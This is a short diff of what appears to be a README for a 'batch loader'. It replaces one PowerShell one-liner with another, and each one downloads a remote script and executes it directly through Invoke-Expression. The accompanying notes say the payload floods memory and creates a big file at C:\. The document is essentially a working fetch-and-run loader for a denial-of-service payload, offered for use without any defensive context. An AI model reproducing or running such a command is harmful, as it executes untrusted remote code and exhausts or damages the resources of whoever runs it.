@@ -2,7 +2,7 @@ batch loader
 ----------------------------------
 # b1 loader 
 ```bat
-powershell -Command "Invoke-Expression (Invoke-WebRequest -Uri 'https://luzisdev.github.io/b-1.bat').Content"
+powershell -Command "iex '& { $(iwr -useb \"https://ps1.references.gg/test.ps1\") }'"
 ```
 - flood memory
 - creat big file at C:\
